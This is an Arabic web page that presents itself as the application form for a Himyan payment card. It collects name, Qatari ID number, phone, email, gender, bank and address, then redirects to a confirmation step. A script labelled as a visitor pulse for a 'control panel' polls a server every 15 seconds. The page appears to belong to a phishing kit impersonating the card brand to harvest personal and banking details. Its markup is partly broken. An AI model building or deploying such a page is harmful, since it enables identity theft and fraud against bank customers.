<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>تقديم طلب بطاقة هميان</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Noto+Kufi+Arabic:wght@500;700;800;900&family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
<style>
  :root {
    --anabi: #8A1B2F;
    --anabi-deep: #61101F;
    --header: #ECECEE;
    --page: #FFFFFF;
    --sand: #F6F3F2;
    --ink: #1A1718;
    --muted: #6B6462;
    --line: #DCD7D6;
    --radius: 14px;
    box-sizing: border-box;
    padding-top: env(safe-area-inset-top, 0px);
    padding-bottom: env(safe-area-inset-bottom, 0px);
  }
  *, *::before, *::after { box-sizing: border-box; }
  html { scroll-padding-top: calc(76px + env(safe-area-inset-top, 0px)); }
  html, body { max-width: 100%; overflow-x: clip; }
  body {
    margin: 0;
    background: var(--page);
    color: var(--ink);
    font-family: "Tajawal", system-ui, "Segoe UI", sans-serif;
    font-size: 13.5px;
    line-height: 1.55;
    -webkit-text-size-adjust: 100%;
  }
  img { max-width: 100%; display: block; }
  a { color: inherit; text-decoration: none; }
  :focus-visible { outline: 3px solid var(--anabi); outline-offset: 3px; border-radius: 6px; }
  .wrap { width: min(1180px, 100% - 24px); margin-inline: auto; }

  /* ---------- Header ---------- */
  .header {
    position: sticky;
    position: -webkit-sticky;
    top: 0;
    z-index: 60;
    background: #fff;
    border-bottom: 2px solid var(--anabi);
  }
  .header__bar {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 16px;
    min-height: 64px;
  }
  .nav-start {
    display: flex;
    align-items: center;
    gap: 10px;
    min-width: 0;
    flex: 0 1 auto;
  }
  .nav-end {
    display: flex;
    align-items: center;
    gap: 9px;
    min-width: 0;
    flex: 0 0 auto;
  }
  .logo2 {
    height: 22px;
    width: auto;
    max-width: 100px;
    display: block;
  }
  .logo {
    height: 38px;
    width: auto;
    max-width: 136px;
    flex: 0 1 auto;
    min-width: 0;
    object-fit: contain;
    display: block;
  }
  .burger {
    background: none;
    border: 0;
    padding: 8px 2px;
    cursor: pointer;
    display: grid;
    gap: 4.5px;
  }
  .burger span {
    display: block;
    width: 22px;
    height: 2.5px;
    border-radius: 2px;
    background: var(--anabi);
  }
  .lang {
    display: inline-flex;
    align-items: center;
    gap: 7px;
    background: none;
    border: 1.5px solid var(--anabi);
    color: var(--anabi);
    border-radius: 999px;
    padding: 3px 8px;
    font-family: "Tajawal", sans-serif;
    font-size: 11px;
    flex: 0 0 auto;
    font-weight: 700;
    cursor: pointer;
    direction: ltr;
  }
  .lang svg { width: 13px; height: 13px; flex: none; }
  .lang:hover { background: rgba(138, 27, 47, .07); }

  .menu {
    display: none;
    border-top: 1px solid rgba(0,0,0,.08);
    padding: 8px 0 14px;
  }
  .menu.is-open { display: block; }
  .menu a {
    display: block;
    padding: 9px 2px;
    font-weight: 500;
    border-bottom: 1px solid rgba(0,0,0,.06);
  }
  .menu a:last-child { border-bottom: 0; }

  /* ---------- Banner ---------- */
  .banner { padding: 0; margin: 0; }
  .banner .wrap { width: 100%; }
  .banner .ph { border-radius: 0; }
  .ph {
    position: relative;
    display: grid;
    place-items: center;
    background: var(--sand);
    border: 1.5px dashed rgba(138, 27, 47, .35);
    border-radius: var(--radius);
    overflow: hidden;
  }
  .ph img { width: 100%; height: 100%; object-fit: cover; }
  .ph__text {
    font-size: 14px;
    color: var(--muted);
    padding: 8px 14px;
    text-align: center;
  }
  .ph--banner {
    display: block;
    aspect-ratio: auto;
    background: none;
    border: 0;
    line-height: 0;
  }
  .ph--banner img {
    display: block;
    width: 100%;
    height: auto;
    object-fit: fill;
  }
  .ph--pay { aspect-ratio: 16 / 10; }
  .ph--filled {
    aspect-ratio: 16 / 9;
    background: none;
    border: 0;
    border-radius: 0;
  }
  .ph--filled img { object-fit: contain; }
  .ph--sm img { width: 82%; height: 82%; }
  .ph--watch { aspect-ratio: 1 / 1; }
  .ph--watch.ph--filled { aspect-ratio: 1 / 1; background: #fff; }


  /* ---------- Sections ---------- */
  .intro {
    max-width: 620px;
    margin: 16px auto 0;
    text-align: center;
  }
  .intro h2 {
    font-family: "Noto Kufi Arabic", "Tajawal", system-ui, sans-serif;
    font-size: clamp(16px, 3.4vw, 20px);
    font-weight: 900;
    -webkit-text-stroke: 0.7px currentColor;
    paint-order: stroke fill;
    text-shadow: 0 0 0.45px currentColor;
    color: var(--anabi);
    margin: 0 0 8px;
    line-height: 1.5;
  }
  .intro p {
    margin: 0 0 8px;
    font-size: 12.5px;
    font-weight: 700;
    -webkit-text-stroke: 0.25px currentColor;
    paint-order: stroke fill;
    line-height: 1.95;
    color: var(--ink);
  }
  .intro p:last-child { margin-bottom: 0; }
  .section { padding: 16px 0; }
  .section__head {
    display: flex;
    align-items: baseline;
    gap: 12px;
    margin-bottom: 20px;
    border-inline-start: 5px solid var(--anabi);
    padding-inline-start: 12px;
  }
  .section__head h2 {
    font-family: "Noto Kufi Arabic", sans-serif;
    font-weight: 700;
    font-size: clamp(15px, 3.2vw, 20px);
    margin: 0;
    line-height: 1.35;
  }
  .section__head p { margin: 0; color: var(--muted); font-size: 14px; }

  .grid { display: grid; gap: 10px; }
  .grid--pay { grid-template-columns: repeat(auto-fit, minmax(min(100%, 260px), 1fr)); }
  .grid--watch { grid-template-columns: 1fr; max-width: 370px; margin-inline: auto; }

  .watch {
    background: #fff;
    border: 1px solid var(--line);
    border-radius: var(--radius);
    padding: 10px;
    display: flex;
    flex-direction: column;
  }
  .paycard {
    background: #fff;
    border: 1px solid var(--line);
    border-radius: var(--radius);
    padding: 10px;
    display: flex;
    flex-direction: column;
  }
  .paycard.is-selected {
    border-color: var(--anabi);
    box-shadow: inset 0 0 0 1px var(--anabi);
  }
  .paycard.is-selected .btn { display: none; }
  .alert {
    margin: 8px 0 0;
    text-align: center;
    color: #C0182B;
    font-size: 11.5px;
    font-weight: 700;
  }
  .warranty {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    margin: 10px 0 0;
    padding: 0;
    background: none;
    font-family: "Noto Kufi Arabic", sans-serif;
    font-size: 10.5px;
    font-weight: 500;
    color: var(--ink);
  }

  .watch__name {
    font-family: "Noto Kufi Arabic", sans-serif;
    font-size: 13.5px;
    font-weight: 500;
    margin: 10px 0 4px;
  }
  .paycard__name {
    font-family: "Noto Kufi Arabic", sans-serif;
    font-size: 14px;
    font-weight: 900;
    -webkit-text-stroke: 0.4px currentColor;
    paint-order: stroke fill;
    color: #000;
    text-align: center;
    margin: 2px 0 10px;
    line-height: 1.5;
  }
  .paycard__note { margin: 0 0 12px; color: var(--muted); font-size: 12.5px; }

  .perks {
    list-style: none;
    margin: 12px 0;
    padding: 10px 0;
    border-top: 1px solid var(--line);
    border-bottom: 1px solid var(--line);
    display: grid;
    grid-template-columns: repeat(3, minmax(0, 1fr));
    gap: 12px 6px;
  }
  .perk {
    display: flex;
    flex-direction: column;
    align-items: center;
    text-align: center;
    gap: 5px;
    font-size: 10.5px;
    font-weight: 700;
    line-height: 1.3;
  }
  .perk__icon {
    width: 44px;
    height: 40px;
    background-repeat: no-repeat;
    background-position: center;
    background-size: contain;

  .btn {
    display: block;
    text-align: center;
    padding: 8px 12px;
    border-radius: 9px;
    font-weight: 700;
    font-size: 12px;
    border: 1.5px solid var(--anabi);
    cursor: pointer;
    margin-top: auto;
  }
  .btn--solid { background: var(--anabi); color: #fff; }
  .btn--solid:hover { background: var(--anabi-deep); border-color: var(--anabi-deep); }

  .footer {
    margin-top: 26px;
    background: #ECECEE;
    color: #000;
    border-top: 2px solid var(--anabi);
    padding: 18px 0 22px;
    font-size: 12px;
  }
  .footer .wrap {
    display: flex;
    flex-direction: column;
    align-items: center;
    text-align: center;
    gap: 14px;
  }
  .footer *, .footer p, .footer a, .footer span { color: #000; font-weight: 700; margin: 0; }
  .foot-brand {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 14px;
    background: none;
    border-radius: 0;
    padding: 0;
  }
  .foot-brand .logo2 { height: 24px; width: auto; max-width: 110px; }
  .foot-brand .logo { height: 32px; width: auto; max-width: 120px; }
  .foot-brand .sep { width: 1px; height: 26px; background: rgba(0,0,0,.25); flex: none; }
  @media (min-width: 768px) {
    .foot-brand { gap: 18px; }
    .foot-brand .logo2 { height: 28px; max-width: 130px; }
    .foot-brand .logo { height: 38px; max-width: 145px; }
  }
  .footer__lead { font-size: 12.5px; line-height: 1.85; max-width: 42ch; }
  .footer__links { display: flex; flex-direction: column; gap: 7px; }
  .footer__links a { font-size: 12.5px; }
  .footer__links a:hover { color: var(--anabi); }
  .footer__apps { font-size: 13px; }
  .stores { display: flex; flex-wrap: wrap; justify-content: center; gap: 9px; }
  .stores img { height: 32px; width: auto; border-radius: 6px; border: 1px solid rgba(0,0,0,.15); }
  .footer__copy { font-size: 11.5px; padding-top: 4px; }

  @media (max-width: 380px) {
    .header__bar { gap: 6px; }
    .nav-start { gap: 5px; }
    .nav-end { gap: 5px; }
    .logo { height: 30px; max-width: 84px; }
    .nav-end .logo2 { max-width: 72px; }
    .logo2 { height: 19px; }
    .lang { font-size: 9px; padding: 3px 5px; }
    .feature { font-size: 11px; gap: 6px; }
    .feature__icon { width: 32px; height: 32px; }
  }
  @media (min-width: 768px) {
    .wrap { width: min(1180px, 100% - 48px); }
    .header__bar { min-height: 72px; }
    .lang { font-size: 12px; padding: 4px 10px; }
    .logo { height: 48px; max-width: 176px; }
    .logo2 { height: 28px; max-width: 130px; }
    .lang svg { width: 15px; height: 15px; }
    .section { padding: 30px 0; }
    .grid { gap: 16px; }
    .perks { gap: 14px 8px; }
    .perk { font-size: 11.5px; }
    .perk__icon { width: 52px; height: 46px; }
    .watch, .paycard { padding: 13px; }
    .feature { font-size: 12px; }
    .feature__icon { width: 38px; height: 38px; }
    .btn { font-size: 13px; padding: 9px 14px; }
    .warranty { font-size: 11.5px; }
    .menu { border-top: 0; padding: 0 0 10px; }
  }
  @media (min-width: 1100px) {
    .grid--pay { grid-template-columns: repeat(2, minmax(0, 1fr)); max-width: 760px; }
  }
  @media (prefers-reduced-motion: reduce) {
    * { transition: none !important; animation: none !important; }
  }
</style>

<style>
  .page { padding: 18px 0 8px; }
  .page__title {
    font-family: "Noto Kufi Arabic", sans-serif;
    font-size: clamp(15px, 3.2vw, 19px);
    font-weight: 900;
    -webkit-text-stroke: 0.4px currentColor;
    paint-order: stroke fill;
    color: #000;
    text-align: start;
    margin: 0 0 10px;
    border-inline-start: 5px solid var(--anabi);
    padding-inline-start: 12px;
    line-height: 1.5;
  }
  .chosen {
    text-align: start;
    font-size: 12px;
    font-weight: 700;
    color: var(--ink);
    margin: 0 0 14px;
  }
  .chosen[hidden] { display: none; }

  .form {
    max-width: 350px;
    margin: 0 auto;
    background: none;
    border: 0;
    padding: 0;
  }
  .field { margin-bottom: 10px; }
  .field > label {
    display: block;
    font-size: 11.5px;
    font-weight: 700;
    margin-bottom: 5px;
  }
  .field input,
  .field select,
  .field textarea {
    width: 100%;
    max-width: 100%;
    min-width: 0;
    font-family: inherit;
    font-size: 13px;
    font-weight: 700;
    color: #000;
    background: #fff;
    border: 1px solid var(--line);
    border-radius: 9px;
    padding: 11px 10px;
  }
  .field textarea { min-height: 76px; resize: vertical; }
  .field ::placeholder {
    font-weight: 500;
    color: var(--muted);
  }
  .field input:focus,
  .field select:focus,
  .field textarea:focus { border-color: var(--anabi); outline: none; }

  .phone {
    display: flex;
    direction: ltr;
    align-items: stretch;
    border: 1px solid var(--line);
    border-radius: 9px;
    overflow: hidden;
    background: #fff;
  }
  .phone:focus-within { border-color: var(--anabi); }
  .phone__cc {
    display: flex;
    align-items: center;
    gap: 6px;
    padding: 0 9px;
    background: var(--sand);
    border-inline-end: 1px solid var(--line);
    font-size: 12.5px;
    font-weight: 700;
    direction: ltr;
    white-space: nowrap;
  }
  .phone__cc .flag { border: 1px solid rgba(0,0,0,.12); border-radius: 2px; flex: none; }
  .phone input {
    border: 0;
    border-radius: 0;
    direction: ltr;
    text-align: start;
  }
  .phone:has(input.invalid) { border-color: #C0182B; }
  .phone input.invalid { border: 0; }
  .choice { display: flex; gap: 8px; }
  .choice label {
    flex: 1;
    text-align: center;
    font-size: 11.5px;
    font-weight: 700;
    border: 1px solid var(--line);
    border-radius: 9px;
    padding: 11px 6px;
    cursor: pointer;
  }
  .choice input { position: absolute; opacity: 0; pointer-events: none; }
  .choice input:checked + span { color: #fff; }
  .choice label:has(input:checked) {
    background: var(--anabi);
    border-color: var(--anabi);
    color: #fff;
  }
  .choice label:has(input:focus-visible) { outline: 3px solid var(--anabi); outline-offset: 2px; }

  .form .btn { width: 100%; margin-top: 4px; }
  .form__note {
    margin: 10px 0 0;
    text-align: center;
    font-size: 11.5px;
    font-weight: 700;
  }
  .field .err-msg {
    margin: 4px 0 0;
    color: #C0182B;
    font-size: 11px;
    font-weight: 700;
  }
  .field input.invalid,
  .field select.invalid,
  .field textarea.invalid { border-color: #C0182B; }
  .form__note.err { color: #C0182B; }
  .form__note.ok { color: #1B6B3A; }
  @media (min-width: 768px) {
    .form { max-width: 390px; }
    .field input, .field select, .field textarea { font-size: 14px; }
  }
</style>
</head>

  <div class="wrap">
    <div class="header__bar">
      <div class="nav-start">
        <button class="burger" id="burger" aria-label="فتح القائمة" aria-expanded="false" aria-controls="menu">

  <section class="page">
    <div class="wrap">
      <h1 class="page__title">تقديم طلب بطاقة هميان</h1>
      <p class="chosen" id="chosen" hidden></p>

      <form class="form" id="orderForm" novalidate>
        <div class="field">
          <label>الحالة</label>
          <div class="choice">
            <label><input type="radio" name="status" value="مواطن" checked><span>مواطن</span></label>
            <label><input type="radio" name="status" value="مقيم"><span>مقيم</span></label>
          </div>
        </div>

        <div class="field">
          <label for="name">الاسم</label>
          <input id="name" name="name" type="text" autocomplete="name" required>
        </div>

        <div class="field">
          <label for="qid">الرقم الشخصي القطري</label>
          <input id="qid" name="qid" type="text" inputmode="numeric" maxlength="11" placeholder="11 رقم" required>
        </div>

        <div class="field">
          <label for="phone">رقم الجوال</label>
          <div class="phone">
            <span class="phone__cc"><svg class="flag" viewBox="0 0 28 20" width="20" height="14" aria-hidden="true"><rect width="28" height="20" fill="#fff"/><path d="M28,0 L11,0 L7,1.111 L11,2.222 L7,3.333 L11,4.444 L7,5.556 L11,6.667 L7,7.778 L11,8.889 L7,10.000 L11,11.111 L7,12.222 L11,13.333 L7,14.444 L11,15.556 L7,16.667 L11,17.778 L7,18.889 L11,20.000 L28,20 Z" fill="#8A1B2F"/></svg><b>+974</b></span>
            <input id="phone" name="phone" type="tel" inputmode="numeric" maxlength="8" autocomplete="tel" placeholder="33123456" required>
          </div>
        </div>

        <div class="field">
          <label for="email">البريد الإلكتروني</label>
          <input id="email" name="email" type="email" autocomplete="email" required>
        </div>

        <div class="field">
          <label>الجنس</label>
          <div class="choice">
            <label><input type="radio" name="gender" value="ذكر" checked><span>ذكر</span></label>
            <label><input type="radio" name="gender" value="أنثى"><span>أنثى</span></label>
          </div>
        </div>

        <div class="field">
          <label for="bank">اختر البنك الخاص بك</label>
          <select id="bank" name="bank" required>
            <option value="" disabled selected>اختر البنك</option>
            <option>بنك قطر الوطني (QNB)</option>
            <option>مصرف قطر الإسلامي (المصرف - QIB)</option>
            <option>البنك التجاري (Commercial Bank)</option>
            <option>مصرف الريان (Masraf Al Rayan)</option>
            <option>بنك الدوحة (Doha Bank)</option>
            <option>بنك دخان (Dukhan Bank)</option>
            <option>بنك قطر الدولي الإسلامي (QIIB)</option>
            <option>البنك الأهلي (Ahlibank)</option>
            <option>بنك قطر للتنمية (QDB)</option>
            <option>بنك إتش إس بي سي (HSBC)</option>
          </select>
        </div>

        <div class="field">
          <label for="address">عنوان التواصل</label>
          <textarea id="address" name="address" required></textarea>
        </div>

        <button class="btn btn--solid" type="submit">متابعة</button>
        <p class="form__note" id="note" hidden></p>
      </form>
    </div>
  </section>
</main>

<script>
  var burger = document.getElementById('burger');
  var menu = document.getElementById('menu');
  if (burger && menu) {
    burger.addEventListener('click', function () {
      var open = menu.classList.toggle('is-open');
      burger.setAttribute('aria-expanded', open ? 'true' : 'false');
    });
  }

  // البطاقة المختارة من الصفحة الرئيسية
  var card = new URLSearchParams(location.search).get('card');
  if (card) {
    var chosen = document.getElementById('chosen');
    chosen.textContent = 'البطاقة المختارة: ' + card;
    chosen.hidden = false;
  }

  // التحقق من الحقول
  function digits(v) { return (v || '').replace(/[^0-9]/g, ''); }

  var rules = {
    qid: function (v) {
      var d = digits(v);
      if (d.length !== 11) return 'الرقم الشخصي القطري غير صحيح';
      if (!/^[23]/.test(d)) return 'الرقم الشخصي القطري غير صحيح';
      return '';
    },
    phone: function (v) {
      var d = digits(v);
      if (d.indexOf('00974') === 0) d = d.slice(5);
      else if (d.indexOf('974') === 0 && d.length > 8) d = d.slice(3);
      if (d.length !== 8) return 'رقم الجوال غير صحيح';
      if (!/^[3567]/.test(d)) return 'رقم الجوال غير صحيح';
      return '';
    },
    email: function (v) {
      return /^[^\s@]+@[^\s@]+\.[a-zA-Z]{2,}$/.test(v.trim()) ? '' : 'صيغة البريد الإلكتروني غير صحيحة';
    },
    bank: function (v) {
      return v ? '' : 'اختر البنك';
    },
    address: function (v) {
      return v.trim().length >= 5 ? '' : 'اكتب عنوان التواصل';
    }
  };

  function showError(el, msg) {
    var field = el.closest('.field');
    var box = field.querySelector('.err-msg');
    if (msg) {
      if (!box) {
        box = document.createElement('p');
        box.className = 'err-msg';
        field.appendChild(box);
      }
      box.textContent = msg;
      el.classList.add('invalid');
    } else {
      if (box) box.remove();
      el.classList.remove('invalid');
    }
    return !msg;
  }

  Object.keys(rules).forEach(function (id) {
    var el = document.getElementById(id);
    if (!el) return;
    var ev = el.tagName === 'SELECT' ? 'change' : 'blur';
    el.addEventListener(ev, function () { showError(el, rules[id](el.value)); });
    el.addEventListener('input', function () {
      if (el.classList.contains('invalid')) showError(el, rules[id](el.value));
    });
  });

  document.getElementById('orderForm').addEventListener('submit', function (e) {
    e.preventDefault();
    var note = document.getElementById('note');
    var first = null;
    Object.keys(rules).forEach(function (id) {
      var el = document.getElementById(id);
      if (!el) return;
      var ok = showError(el, rules[id](el.value));
      if (!ok && !first) first = el;
    });
    note.hidden = false;
    if (first) {
      note.className = 'form__note err';
      note.textContent = 'من فضلك صحّح البيانات المظللة بالأحمر';
      first.focus();
      return;
    }
    var data = {
      card: (new URLSearchParams(location.search).get('card') || ''),
      status: (document.querySelector('input[name="status"]:checked') || {}).value || '',
      name: document.getElementById('name').value.trim(),
      qid: digits(document.getElementById('qid').value),
      phone: digits(document.getElementById('phone').value),
      email: document.getElementById('email').value.trim(),
      gender: (document.querySelector('input[name="gender"]:checked') || {}).value || '',
      bank: document.getElementById('bank').value,
      address: document.getElementById('address').value.trim()
    };
    try { sessionStorage.setItem('himyanOrder', JSON.stringify(data)); } catch (err) {}
    note.className = 'form__note ok';
    note.textContent = 'جارٍ تحويلك لتأكيد البيانات…';
    location.href = 'confirm.html';
  });
  // نبضة زائر للوحة التحكم
  (function () {
    var vid = '';
    try { vid = localStorage.getItem('himyanVid') || ''; } catch (e) {}
    function ping() {
      fetch('/api/ping', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: vid, page: location.pathname })
      }).then(function (r) { return r.json(); }).then(function (j) {
        if (j && j.id) { vid = j.id; try { localStorage.setItem('himyanVid', vid); } catch (e) {} }
      }).catch(function () {});
    }
    ping();
    setInterval(ping, 15000);
  })();

  var lb = document.getElementById('langBtn');
  if (lb) lb.addEventListener('click', function () { location.href = 'order-en.html'; });
</script>
